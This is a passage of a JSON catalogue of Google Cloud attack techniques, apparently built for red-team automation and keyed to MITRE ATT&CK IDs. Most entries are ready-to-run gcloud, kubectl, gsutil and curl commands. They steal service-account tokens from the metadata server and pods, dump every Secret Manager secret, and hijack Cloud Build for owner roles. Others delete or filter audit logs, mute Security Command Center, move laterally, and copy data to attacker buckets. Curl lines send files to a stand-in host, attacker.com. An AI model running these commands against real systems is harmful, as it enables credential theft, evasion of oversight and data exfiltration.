        "gcloud compute instances set-service-account <INSTANCE_NAME> --zone=<ZONE> --service-account=<HIGH_PRIV_SA_EMAIL> --scopes=cloud-platform",
        "gcloud compute instances start <INSTANCE_NAME> --zone=<ZONE>",
        "# SSH to instance and steal its token",
        "gcloud compute ssh privesc-instance --zone=<ZONE> --command='curl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
        "# Create instance template with privileged SA for persistence",
        "gcloud compute instance-templates create privesc-template --service-account=<HIGH_PRIV_SA_EMAIL> --scopes=cloud-platform",
        "# Create managed instance group using template",
        "gcloud compute instance-groups managed create privesc-mig --zone=<ZONE> --template=privesc-template --size=1",
        "# Check default compute service account email",
        "gcloud iam service-accounts list --filter='displayName:Compute Engine default'",
        "# Check scopes on existing instance",
        "gcloud compute instances describe <INSTANCE_NAME> --zone=<ZONE> --format='value(serviceAccounts.scopes)'",
        "# Create instance with default SA but full scopes",
        "gcloud compute instances create full-scope-instance --zone=<ZONE> --scopes=cloud-platform"
      ]
    },
    {
      "id": "GCP-PRIVESC-004",
      "mitre_id": "T1548",
      "name": "Cloud Build Service Account Abuse",
      "phase": "privilege_escalation",
      "infrastructure": "gcp",
      "description": "Abuse Cloud Build's default service account with broad permissions",
      "prerequisites": ["Cloud Build Editor role"],
      "tools": ["gcloud CLI", "Custom build configs"],
      "detection": "Cloud Audit Logs, build job logs",
      "references": ["https://attack.mitre.org/techniques/T1548/"],
      "next_techniques": ["GCP-EXEC-001"],
      "risk_level": "high",
      "commands": [
        "# Check Cloud Build default service account",
        "gcloud projects describe $(gcloud config get-value project) --format='value(projectNumber)'",
        "# Default Cloud Build SA is: <PROJECT_NUMBER>@cloudbuild.gserviceaccount.com",
        "# Check Cloud Build SA permissions",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --flatten='bindings[].members' --filter='bindings.members:cloudbuild.gserviceaccount.com'",
        "# Create malicious cloudbuild.yaml to steal SA token",
        "# steps:\\n- name: 'gcr.io/cloud-builders/gcloud'\\n  entrypoint: 'bash'\\n  args: ['-c', 'curl -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token']",
        "# Submit build to execute privileged commands",
        "gcloud builds submit --config=cloudbuild.yaml .",
        "# Use Cloud Build to create service account keys",
        "# steps:\\n- name: 'gcr.io/cloud-builders/gcloud'\\n  args: ['iam', 'service-accounts', 'keys', 'create', 'key.json', '--iam-account=<SA_EMAIL>']",
        "# Use Cloud Build to grant IAM roles",
        "# steps:\\n- name: 'gcr.io/cloud-builders/gcloud'\\n  args: ['projects', 'add-iam-policy-binding', '$PROJECT_ID', '--member=user:<EMAIL>', '--role=roles/owner']",
        "# Check Cloud Build triggers for supply chain attacks",
        "gcloud builds triggers list",
        "# Create Cloud Build trigger for persistence",
        "gcloud builds triggers create github --repo-name=<REPO> --repo-owner=<OWNER> --branch-pattern='^main$' --build-config=cloudbuild.yaml",
        "# List recent builds",
        "gcloud builds list --limit=10",
        "# Get build logs",
        "gcloud builds log <BUILD_ID>",
        "# Specify custom service account for build",
        "gcloud builds submit --service-account=projects/<PROJECT>/serviceAccounts/<SA_EMAIL> --config=cloudbuild.yaml ."
      ]
    },
    {
      "id": "GCP-DEFENSE-001",
      "mitre_id": "T1562.008",
      "name": "Cloud Audit Logging Disable",
      "phase": "defense_evasion",
      "infrastructure": "gcp",
      "description": "Disable or modify Cloud Audit Logs to hide malicious activity",
      "prerequisites": ["Logging Admin role"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, logging config changes",
      "references": ["https://attack.mitre.org/techniques/T1562/008/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Check current audit log configuration",
        "gcloud projects get-iam-policy $(gcloud config get-value project) --format=json | jq '.auditConfigs'",
        "# List log sinks (where logs are exported)",
        "gcloud logging sinks list",
        "# Delete a log sink to prevent log export",
        "gcloud logging sinks delete <SINK_NAME>",
        "# Modify log sink filter to exclude attacker activity",
        "gcloud logging sinks update <SINK_NAME> --log-filter='NOT protoPayload.authenticationInfo.principalEmail=\"attacker@example.com\"'",
        "# Create exclusion filter to drop specific logs",
        "gcloud logging sinks create null-sink storage.googleapis.com/dev-null --log-filter='resource.type=\"gce_instance\"' --exclusion",
        "# List log exclusions",
        "gcloud logging exclusions list",
        "# Create exclusion for specific principal",
        "gcloud logging exclusions create hide-attacker --filter='protoPayload.authenticationInfo.principalEmail=\"attacker@example.com\"'",
        "# Disable data access logging for specific services",
        "gcloud projects get-iam-policy $(gcloud config get-value project) > policy.yaml",
        "# Edit policy.yaml to remove auditLogConfigs",
        "gcloud projects set-iam-policy $(gcloud config get-value project) policy.yaml",
        "# Delete specific logs (requires logs.delete permission)",
        "gcloud logging logs delete <LOG_NAME>",
        "# Check log retention settings",
        "gcloud logging buckets describe _Default --location=global",
        "# Reduce log retention period",
        "gcloud logging buckets update _Default --location=global --retention-days=1"
      ]
    },
    {
      "id": "GCP-DEFENSE-002",
      "mitre_id": "T1562.001",
      "name": "Security Command Center Disable",
      "phase": "defense_evasion",
      "infrastructure": "gcp",
      "description": "Disable Security Command Center to prevent threat detection",
      "prerequisites": ["Security Center Admin role"],
      "tools": ["gcloud CLI", "Console"],
      "detection": "Cloud Audit Logs, SCC config changes",
      "references": ["https://attack.mitre.org/techniques/T1562/001/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# List Security Command Center sources",
        "gcloud scc sources list --organization=<ORG_ID>",
        "# List active findings",
        "gcloud scc findings list <ORG_ID> --source=<SOURCE_ID>",
        "# Mute a finding to hide it",
        "gcloud scc findings set-mute <ORG_ID>/sources/<SOURCE_ID>/findings/<FINDING_ID> --mute=MUTED",
        "# Create mute config to auto-mute findings",
        "gcloud scc muteconfigs create auto-mute --organization=<ORG_ID> --filter='category=\"OPEN_FIREWALL\"' --description='Auto mute open firewall findings'",
        "# List mute configs",
        "gcloud scc muteconfigs list --organization=<ORG_ID>",
        "# Update finding state to mark as resolved",
        "gcloud scc findings update <ORG_ID>/sources/<SOURCE_ID>/findings/<FINDING_ID> --state=INACTIVE",
        "# Disable Security Health Analytics",
        "gcloud services disable securitycenter.googleapis.com",
        "# Check SCC notification configs",
        "gcloud scc notifications list --organization=<ORG_ID>",
        "# Delete notification config to stop alerts",
        "gcloud scc notifications delete <CONFIG_NAME> --organization=<ORG_ID>",
        "# Modify notification filter to exclude attacker activity",
        "gcloud scc notifications update <CONFIG_NAME> --organization=<ORG_ID> --filter='NOT resource.project_display_name=\"attacker-project\"'",
        "# Check for Web Security Scanner",
        "gcloud web-security-scanner scan-configs list",
        "# Delete security scan config",
        "gcloud web-security-scanner scan-configs delete <SCAN_CONFIG_ID>"
      ]
    },
    {
      "id": "GCP-CRED-001",
      "mitre_id": "T1552.005",
      "name": "Metadata Server Credential Theft",
      "phase": "credential_access",
      "infrastructure": "gcp",
      "description": "Access GCE metadata server to steal service account tokens via SSRF or instance access",
      "prerequisites": ["Access to GCE instance or SSRF vulnerability"],
      "tools": ["curl", "Custom scripts"],
      "detection": "VPC Flow Logs to metadata IP, instance logs",
      "references": ["https://attack.mitre.org/techniques/T1552/005/"],
      "next_techniques": ["GCP-PRIVESC-001", "GCP-LATERAL-001"],
      "risk_level": "critical",
      "commands": [
        "# Get access token from metadata server",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
        "# Get service account email",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email'",
        "# List all service accounts on the instance",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/'",
        "# Get scopes for the service account",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes'",
        "# Get identity token for a specific audience",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com'",
        "# Get project ID",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/project-id'",
        "# Get project number",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/numeric-project-id'",
        "# Get all project attributes",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/project/attributes/'",
        "# Get instance attributes (may contain secrets)",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/'",
        "# Get SSH keys from metadata",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/attributes/ssh-keys'",
        "# Get instance zone",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/zone'",
        "# Get instance hostname",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/hostname'",
        "# Get network interfaces",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/'",
        "# Recursive query to get all metadata",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/?recursive=true'",
        "# Use stolen token with gcloud",
        "export CLOUDSDK_AUTH_ACCESS_TOKEN=<STOLEN_TOKEN> && gcloud projects list"
      ]
    },
    {
      "id": "GCP-CRED-002",
      "mitre_id": "T1552.001",
      "name": "Secret Manager Extraction",
      "phase": "credential_access",
      "infrastructure": "gcp",
      "description": "Extract secrets from GCP Secret Manager",
      "prerequisites": ["Secret Manager Secret Accessor role"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, secret access events",
      "references": ["https://attack.mitre.org/techniques/T1552/001/"],
      "next_techniques": ["GCP-LATERAL-001"],
      "risk_level": "high",
      "commands": [
        "# List all secrets in the project",
        "gcloud secrets list",
        "# Get secret metadata",
        "gcloud secrets describe <SECRET_NAME>",
        "# List all versions of a secret",
        "gcloud secrets versions list <SECRET_NAME>",
        "# Access the latest secret version",
        "gcloud secrets versions access latest --secret=<SECRET_NAME>",
        "# Access a specific secret version",
        "gcloud secrets versions access <VERSION_ID> --secret=<SECRET_NAME>",
        "# Access secret and decode if base64",
        "gcloud secrets versions access latest --secret=<SECRET_NAME> | base64 -d",
        "# Get secret IAM policy (who has access)",
        "gcloud secrets get-iam-policy <SECRET_NAME>",
        "# List secrets across all projects (requires org-level access)",
        "for project in $(gcloud projects list --format='value(projectId)'); do echo \"Project: $project\"; gcloud secrets list --project=$project 2>/dev/null; done",
        "# Access secret via REST API",
        "curl -H \"Authorization: Bearer $(gcloud auth print-access-token)\" \"https://secretmanager.googleapis.com/v1/projects/$(gcloud config get-value project)/secrets/<SECRET_NAME>/versions/latest:access\"",
        "# Search for secrets with specific labels",
        "gcloud secrets list --filter='labels.env=production'",
        "# Check secret replication policy",
        "gcloud secrets describe <SECRET_NAME> --format='value(replication)'",
        "# Dump all accessible secrets",
        "for secret in $(gcloud secrets list --format='value(name)'); do echo \"=== $secret ===\"; gcloud secrets versions access latest --secret=$secret 2>/dev/null; done"
      ]
    },
    {
      "id": "GCP-CRED-003",
      "mitre_id": "T1528",
      "name": "GKE Service Account Token Theft",
      "phase": "credential_access",
      "infrastructure": "gcp",
      "description": "Steal Kubernetes service account tokens from GKE pods",
      "prerequisites": ["Access to GKE pod"],
      "tools": ["kubectl", "Custom scripts"],
      "detection": "GKE audit logs, pod security policies",
      "references": ["https://attack.mitre.org/techniques/T1528/"],
      "next_techniques": ["GCP-LATERAL-002"],
      "risk_level": "high",
      "commands": [
        "# Read mounted service account token from pod",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
        "# Get the namespace from mounted secret",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "# Get CA cert for API server communication",
        "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "# Use token to query Kubernetes API",
        "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces",
        "# List pods using stolen token",
        "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods -A",
        "# Check what the service account can do",
        "kubectl auth can-i --list --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
        "# Get secrets from current namespace",
        "kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get secrets",
        "# Steal GCP service account token from Workload Identity",
        "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'",
        "# Get GKE cluster credentials (from compromised node)",
        "gcloud container clusters get-credentials <CLUSTER_NAME> --zone=<ZONE>",
        "# List all service accounts in cluster",
        "kubectl get serviceaccounts -A",
        "# Describe a service account to find tokens",
        "kubectl describe serviceaccount <SA_NAME> -n <NAMESPACE>",
        "# Get secret containing service account token",
        "kubectl get secret <SECRET_NAME> -n <NAMESPACE> -o jsonpath='{.data.token}' | base64 -d",
        "# Check for projected service account tokens",
        "ls -la /var/run/secrets/kubernetes.io/serviceaccount/",
        "# Access GCP metadata from GKE pod (if not using Workload Identity)",
        "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'"
      ]
    },
    {
      "id": "GCP-DISC-001",
      "mitre_id": "T1580",
      "name": "Cloud Infrastructure Discovery",
      "phase": "discovery",
      "infrastructure": "gcp",
      "description": "Enumerate Compute instances, networks, and other GCP resources",
      "prerequisites": ["Viewer role"],
      "tools": ["gcloud CLI", "ScoutSuite"],
      "detection": "Cloud Audit Logs, describe operations",
      "references": ["https://attack.mitre.org/techniques/T1580/"],
      "next_techniques": ["GCP-LATERAL-001"],
      "risk_level": "low",
      "commands": [
        "# List all Compute Engine instances",
        "gcloud compute instances list",
        "# Get detailed info about an instance",
        "gcloud compute instances describe <INSTANCE_NAME> --zone=<ZONE>",
        "# List all VPC networks",
        "gcloud compute networks list",
        "# List subnets in all networks",
        "gcloud compute networks subnets list",
        "# List firewall rules",
        "gcloud compute firewall-rules list",
        "# Describe specific firewall rule",
        "gcloud compute firewall-rules describe <RULE_NAME>",
        "# Find overly permissive firewall rules",
        "gcloud compute firewall-rules list --filter='sourceRanges.list():0.0.0.0/0'",
        "# List Cloud SQL instances",
        "gcloud sql instances list",
        "# Describe Cloud SQL instance",
        "gcloud sql instances describe <INSTANCE_NAME>",
        "# List Cloud Functions",
        "gcloud functions list",
        "# List Cloud Run services",
        "gcloud run services list",
        "# List App Engine services",
        "gcloud app services list",
        "# List load balancers",
        "gcloud compute forwarding-rules list",
        "# List backend services",
        "gcloud compute backend-services list",
        "# List Cloud DNS zones",
        "gcloud dns managed-zones list",
        "# List VPN tunnels",
        "gcloud compute vpn-tunnels list",
        "# List interconnects",
        "gcloud compute interconnects list",
        "# List all resources using Asset Inventory",
        "gcloud asset search-all-resources --scope=projects/$(gcloud config get-value project)"
      ]
    },
    {
      "id": "GCP-DISC-002",
      "mitre_id": "T1613",
      "name": "GKE Cluster Discovery",
      "phase": "discovery",
      "infrastructure": "gcp",
      "description": "Enumerate GKE clusters, node pools, and workloads",
      "prerequisites": ["GKE Viewer role"],
      "tools": ["gcloud CLI", "kubectl"],
      "detection": "Cloud Audit Logs, GKE API calls",
      "references": ["https://attack.mitre.org/techniques/T1613/"],
      "next_techniques": ["GCP-LATERAL-002", "GCP-CRED-003"],
      "risk_level": "low",
      "commands": [
        "# List all GKE clusters in the project",
        "gcloud container clusters list",
        "# Describe a specific cluster",
        "gcloud container clusters describe <CLUSTER_NAME> --zone=<ZONE>",
        "# Get cluster credentials for kubectl",
        "gcloud container clusters get-credentials <CLUSTER_NAME> --zone=<ZONE>",
        "# List node pools in a cluster",
        "gcloud container node-pools list --cluster=<CLUSTER_NAME> --zone=<ZONE>",
        "# Describe node pool configuration",
        "gcloud container node-pools describe <POOL_NAME> --cluster=<CLUSTER_NAME> --zone=<ZONE>",
        "# List all namespaces",
        "kubectl get namespaces",
        "# List all pods across namespaces",
        "kubectl get pods -A",
        "# List all services",
        "kubectl get services -A",
        "# List all deployments",
        "kubectl get deployments -A",
        "# List all secrets (potential credential access)",
        "kubectl get secrets -A",
        "# List all configmaps",
        "kubectl get configmaps -A",
        "# List all service accounts",
        "kubectl get serviceaccounts -A",
        "# Check cluster roles and bindings",
        "kubectl get clusterroles",
        "kubectl get clusterrolebindings",
        "# List all ingresses (exposed services)",
        "kubectl get ingress -A",
        "# List network policies",
        "kubectl get networkpolicies -A",
        "# Get pod security policies (if enabled)",
        "kubectl get psp",
        "# Describe a pod to get details",
        "kubectl describe pod <POD_NAME> -n <NAMESPACE>",
        "# Check for privileged containers",
        "kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true) | .metadata.name'"
      ]
    },
    {
      "id": "GCP-LATERAL-001",
      "mitre_id": "T1021.004",
      "name": "SSH to Compute Instance",
      "phase": "lateral_movement",
      "infrastructure": "gcp",
      "description": "Use gcloud compute ssh or OS Login to access other instances",
      "prerequisites": ["Compute OS Login or SSH key access"],
      "tools": ["gcloud CLI", "SSH"],
      "detection": "Cloud Audit Logs, SSH access logs",
      "references": ["https://attack.mitre.org/techniques/T1021/004/"],
      "next_techniques": ["GCP-CRED-001", "GCP-COLL-002"],
      "risk_level": "medium",
      "commands": [
        "# SSH to instance using gcloud (handles keys automatically)",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE>",
        "# SSH with specific user",
        "gcloud compute ssh <USER>@<INSTANCE_NAME> --zone=<ZONE>",
        "# SSH through IAP tunnel (for instances without public IP)",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --tunnel-through-iap",
        "# SSH with command execution",
        "gcloud compute ssh <INSTANCE_NAME> --zone=<ZONE> --command='id; cat /etc/passwd'",
        "# Add SSH key to project metadata (allows access to all instances)",
        "gcloud compute project-info add-metadata --metadata-from-file=ssh-keys=ssh-keys.txt",
        "# Add SSH key to specific instance",
        "gcloud compute instances add-metadata <INSTANCE_NAME> --zone=<ZONE> --metadata-from-file=ssh-keys=ssh-keys.txt",
        "# List SSH keys in project metadata",
        "gcloud compute project-info describe --format='value(commonInstanceMetadata.items.filter(key:ssh-keys).value)'",
        "# Start IAP tunnel for other ports",
        "gcloud compute start-iap-tunnel <INSTANCE_NAME> 3389 --local-host-port=localhost:13389 --zone=<ZONE>",
        "# SCP file to instance",
        "gcloud compute scp localfile.txt <INSTANCE_NAME>:/tmp/ --zone=<ZONE>",
        "# SCP file from instance",
        "gcloud compute scp <INSTANCE_NAME>:/etc/passwd ./passwd_dump --zone=<ZONE>",
        "# Get serial console output (may contain credentials)",
        "gcloud compute instances get-serial-port-output <INSTANCE_NAME> --zone=<ZONE>",
        "# Connect to serial console interactively",
        "gcloud compute connect-to-serial-port <INSTANCE_NAME> --zone=<ZONE>",
        "# Reset Windows password (Windows instances)",
        "gcloud compute reset-windows-password <INSTANCE_NAME> --zone=<ZONE> --user=<USERNAME>"
      ]
    },
    {
      "id": "GCP-LATERAL-002",
      "mitre_id": "T1021",
      "name": "GKE Pod-to-Pod Movement",
      "phase": "lateral_movement",
      "infrastructure": "gcp",
      "description": "Move laterally within GKE clusters using compromised pods",
      "prerequisites": ["Access to GKE pod", "Network access to other pods"],
      "tools": ["kubectl", "Custom scripts"],
      "detection": "GKE audit logs, network policies",
      "references": ["https://attack.mitre.org/techniques/T1021/"],
      "next_techniques": ["GCP-CRED-003"],
      "risk_level": "high",
      "commands": [
        "# Get current pod's network namespace info",
        "cat /etc/resolv.conf",
        "# Discover services via DNS",
        "nslookup kubernetes.default.svc.cluster.local",
        "# Scan for other pods in the cluster",
        "for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i 2>/dev/null && echo \"10.0.0.$i is alive\"; done",
        "# List services in the cluster (if kubectl available)",
        "kubectl get services -A",
        "# Port scan a discovered pod",
        "for port in 22 80 443 8080 3306 5432 6379 27017; do nc -zv <POD_IP> $port 2>&1 | grep succeeded; done",
        "# Access another pod's service",
        "curl http://<SERVICE_NAME>.<NAMESPACE>.svc.cluster.local:<PORT>",
        "# Execute command in another pod (if kubectl exec allowed)",
        "kubectl exec -it <POD_NAME> -n <NAMESPACE> -- /bin/sh",
        "# Create a pod in another namespace for lateral movement",
        "kubectl run lateral-pod --image=alpine -n <TARGET_NAMESPACE> -- sleep infinity",
        "# Access Kubernetes API from within pod",
        "curl -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/<NAMESPACE>/pods",
        "# Check for network policies that might block movement",
        "kubectl get networkpolicies -A",
        "# Look for services with NodePort (accessible from any node)",
        "kubectl get services -A -o json | jq '.items[] | select(.spec.type==\"NodePort\") | {name: .metadata.name, ports: .spec.ports}'",
        "# Access Kubernetes dashboard if exposed",
        "curl http://kubernetes-dashboard.kubernetes-dashboard.svc.cluster.local",
        "# Mount another pod's volume if using shared storage",
        "kubectl get pvc -A",
        "# Check for exposed debugging endpoints",
        "curl http://<POD_IP>:8001/debug/pprof/"
      ]
    },
    {
      "id": "GCP-LATERAL-003",
      "mitre_id": "T1550.001",
      "name": "Cross-Project Movement",
      "phase": "lateral_movement",
      "infrastructure": "gcp",
      "description": "Move to other GCP projects using shared service accounts or permissions",
      "prerequisites": ["Cross-project role bindings"],
      "tools": ["gcloud CLI"],
      "detection": "Cloud Audit Logs, cross-project API calls",
      "references": ["https://attack.mitre.org/techniques/T1550/001/"],
      "next_techniques": ["GCP-RECON-001"],
      "risk_level": "high",
      "commands": [
        "# List all accessible projects",
        "gcloud projects list",
        "# Check IAM bindings across organization",
        "gcloud organizations get-iam-policy <ORG_ID>",
        "# Find service accounts with cross-project access",
        "gcloud asset search-all-iam-policies --scope=organizations/<ORG_ID> --query='policy:\"serviceAccount:\"'",
        "# Switch to another project",
        "gcloud config set project <TARGET_PROJECT>",
        "# Test access to another project",
        "gcloud compute instances list --project=<TARGET_PROJECT>",
        "# Check shared VPC host project",
        "gcloud compute shared-vpc get-host-project <SERVICE_PROJECT>",
        "# List service projects of a shared VPC",
        "gcloud compute shared-vpc list-associated-resources <HOST_PROJECT>",
        "# Access resources in shared VPC",
        "gcloud compute instances list --project=<HOST_PROJECT>",
        "# Check for cross-project service account usage",
        "gcloud iam service-accounts get-iam-policy <SA_EMAIL> --format=json | jq '.bindings[] | select(.members[] | contains(\"project\"))'",
        "# List BigQuery datasets shared with current project",
        "bq ls --project_id=<SOURCE_PROJECT> --all",
        "# Access shared GCS bucket in another project",
        "gsutil ls gs://<BUCKET_IN_OTHER_PROJECT>/",
        "# Check for organization-level roles",
        "gcloud organizations get-iam-policy <ORG_ID> --flatten='bindings[].members' --filter='bindings.members:$(gcloud config get-value account)'",
        "# Access VPC peered networks",
        "gcloud compute networks peerings list --network=<NETWORK>",
        "# Find folders with access",
        "gcloud resource-manager folders list --organization=<ORG_ID>"
      ]
    },
    {
      "id": "GCP-COLL-001",
      "mitre_id": "T1530",
      "name": "GCS Data Collection",
      "phase": "collection",
      "infrastructure": "gcp",
      "description": "Access and download sensitive data from GCS buckets",
      "prerequisites": ["Storage Object Viewer role or public bucket"],
      "tools": ["gsutil", "gcloud CLI"],
      "detection": "Cloud Audit Logs, storage data access logs",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["GCP-EXFIL-001"],
      "risk_level": "high",
      "commands": [
        "# List all buckets in the project",
        "gsutil ls",
        "# List contents of a bucket",
        "gsutil ls -r gs://<BUCKET_NAME>/",
        "# List with details (size, date)",
        "gsutil ls -l gs://<BUCKET_NAME>/",
        "# Download a specific file",
        "gsutil cp gs://<BUCKET_NAME>/<FILE_PATH> ./",
        "# Download entire bucket contents",
        "gsutil -m cp -r gs://<BUCKET_NAME>/* ./bucket_contents/",
        "# Search for sensitive file types",
        "gsutil ls -r gs://<BUCKET_NAME>/** | grep -E '\\.(pem|key|json|env|config|bak|sql|dump)$'",
        "# Get object metadata",
        "gsutil stat gs://<BUCKET_NAME>/<FILE_PATH>",
        "# Download with parallel threads for speed",
        "gsutil -m -o 'GSUtil:parallel_thread_count=10' cp -r gs://<BUCKET_NAME>/* ./",
        "# Access versioned objects",
        "gsutil ls -a gs://<BUCKET_NAME>/",
        "# Download specific version of a file",
        "gsutil cp gs://<BUCKET_NAME>/<FILE>#<GENERATION_ID> ./",
        "# Read object directly to stdout",
        "gsutil cat gs://<BUCKET_NAME>/<FILE_PATH>",
        "# Search bucket for specific content",
        "gsutil cat gs://<BUCKET_NAME>/<FILE> | grep -i 'password\\|secret\\|key\\|token'",
        "# Check for interesting files using wildcards",
        "gsutil ls gs://<BUCKET_NAME>/**/*.env",
        "gsutil ls gs://<BUCKET_NAME>/**/*secret*",
        "gsutil ls gs://<BUCKET_NAME>/**/*backup*",
        "# Stream download large files",
        "gsutil cp gs://<BUCKET_NAME>/<LARGE_FILE> - | gzip -d > extracted_file"
      ]
    },
    {
      "id": "GCP-COLL-002",
      "mitre_id": "T1530",
      "name": "BigQuery Data Extraction",
      "phase": "collection",
      "infrastructure": "gcp",
      "description": "Query and extract sensitive data from BigQuery datasets",
      "prerequisites": ["BigQuery Data Viewer role"],
      "tools": ["bq CLI", "gcloud CLI"],
      "detection": "Cloud Audit Logs, BigQuery job logs",
      "references": ["https://attack.mitre.org/techniques/T1530/"],
      "next_techniques": ["GCP-EXFIL-001"],
      "risk_level": "high",
      "commands": [
        "# List all datasets in the project",
        "bq ls",
        "# List tables in a dataset",
        "bq ls <DATASET_NAME>",
        "# Get table schema",
        "bq show --schema <DATASET_NAME>.<TABLE_NAME>",
        "# Get table info (row count, size)",
        "bq show <DATASET_NAME>.<TABLE_NAME>",
        "# Query table data",
        "bq query --use_legacy_sql=false 'SELECT * FROM `<PROJECT>.<DATASET>.<TABLE>` LIMIT 1000'",
        "# Export query results to GCS",
        "bq extract <DATASET_NAME>.<TABLE_NAME> gs://<BUCKET_NAME>/export/*.csv",
        "# Run query and save to table for later extraction",
        "bq query --destination_table=<DATASET>.exported_data 'SELECT * FROM `<PROJECT>.<DATASET>.<TABLE>`'",
        "# Search for sensitive columns",
        "bq show --schema <DATASET_NAME>.<TABLE_NAME> | grep -iE 'password|secret|ssn|credit|email|phone'",
        "# Query with wildcard tables",
        "bq query --use_legacy_sql=false 'SELECT * FROM `<PROJECT>.<DATASET>.<TABLE_PREFIX>*` LIMIT 100'",
        "# List all datasets across projects",
        "for project in $(gcloud projects list --format='value(projectId)'); do echo \"Project: $project\"; bq ls --project_id=$project 2>/dev/null; done",
        "# Get dataset IAM policy",
        "bq show --format=prettyjson <DATASET_NAME> | jq '.access'",
        "# Export to JSON format",
        "bq extract --destination_format=NEWLINE_DELIMITED_JSON <DATASET_NAME>.<TABLE_NAME> gs://<BUCKET_NAME>/export.json",
        "# Query information schema for all tables",
        "bq query --use_legacy_sql=false 'SELECT * FROM `<PROJECT>.<DATASET>.INFORMATION_SCHEMA.TABLES`'",
        "# Stream query results locally",
        "bq query --format=csv --use_legacy_sql=false 'SELECT * FROM `<PROJECT>.<DATASET>.<TABLE>`' > data.csv"
      ]
    },
    {
      "id": "GCP-EXFIL-001",
      "mitre_id": "T1537",
      "name": "GCS Bucket Exfiltration",
      "phase": "exfiltration",
      "infrastructure": "gcp",
      "description": "Exfiltrate data by copying to attacker-controlled GCS bucket",
      "prerequisites": ["Storage access", "Internet connectivity"],
      "tools": ["gsutil", "gcloud CLI"],
      "detection": "Cloud Audit Logs, data transfer monitoring",
      "references": ["https://attack.mitre.org/techniques/T1537/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Copy data to attacker-controlled bucket",
        "gsutil cp -r gs://<SOURCE_BUCKET>/* gs://<ATTACKER_BUCKET>/",
        "# Copy with parallel upload for speed",
        "gsutil -m cp -r gs://<SOURCE_BUCKET>/* gs://<ATTACKER_BUCKET>/",
        "# Compress before transfer to reduce detection",
        "gsutil cat gs://<SOURCE_BUCKET>/<FILE> | gzip | gsutil cp - gs://<ATTACKER_BUCKET>/compressed.gz",
        "# Download locally then exfiltrate via other means",
        "gsutil cp -r gs://<SOURCE_BUCKET>/* /tmp/exfil/ && tar czf /tmp/data.tar.gz /tmp/exfil/ && curl -X POST -F 'file=@/tmp/data.tar.gz' https://attacker.com/upload",
        "# Export BigQuery data directly to attacker bucket",
        "bq extract <DATASET_NAME>.<TABLE_NAME> gs://<ATTACKER_BUCKET>/bq_export/*.csv",
        "# Use signed URL for covert exfiltration",
        "gsutil signurl -d 1h key.json gs://<ATTACKER_BUCKET>/upload_target",
        "# Transfer using Transfer Service to external S3",
        "gcloud transfer jobs create gs://<SOURCE_BUCKET> s3://<ATTACKER_S3_BUCKET> --source-creds-file=gcp-creds.json --destination-creds-file=aws-creds.json",
        "# Exfiltrate via Cloud Function",
        "# (deploy function that reads source and posts to external endpoint)",
        "# Split large files for covert transfer",
        "gsutil cp gs://<SOURCE_BUCKET>/<LARGE_FILE> - | split -b 10M - chunk_ && for f in chunk_*; do gsutil cp $f gs://<ATTACKER_BUCKET>/; rm $f; done",
        "# Use streaming transfer to avoid local storage",
        "gsutil cp gs://<SOURCE_BUCKET>/<FILE> - | curl -X PUT -H 'Content-Type: application/octet-stream' --data-binary @- https://attacker.com/upload",
        "# Make bucket publicly accessible for easy download (noisy)",
        "gsutil iam ch allUsers:objectViewer gs://<ATTACKER_BUCKET>",
        "# Exfiltrate Cloud SQL backup",
        "gcloud sql export sql <INSTANCE_NAME> gs://<ATTACKER_BUCKET>/sqldump.sql --database=<DB_NAME>"
      ]
    },
    {
      "id": "GCP-IMPACT-001",
      "mitre_id": "T1485",
